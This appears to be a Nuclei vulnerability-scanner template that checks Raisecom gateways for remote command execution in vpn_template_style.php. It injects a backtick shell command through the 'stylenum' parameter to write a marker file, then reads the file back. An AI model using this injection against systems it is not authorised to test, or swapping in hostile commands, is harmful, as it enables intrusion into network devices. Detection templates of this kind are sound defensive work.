id: raisecom-rce

info:
  name: Remote Command Execution in Raisecom Multi-Service Intelligent Gateway
  author: 3th1c_yuk1
  severity: critical
  description: |
    Remote Command Execution (RCE) vulnerability in Raisecom Multi-Service Intelligent Gateway's `vpn_template_style.php`
  reference: https://github.com/koishi0x01/CVE/blob/main/CVE_1.md
  tags: raisecom,rce

variables:
  string: "{{randstr}}"
  filename: "{{to_lower(rand_text_alpha(5))}}"

http:
  - raw:
      - |
        GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60 HTTP/1.1
        Host: {{Hostname}}
        Connection: close

      - |
        GET /tmp/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2, '{{string}}')"
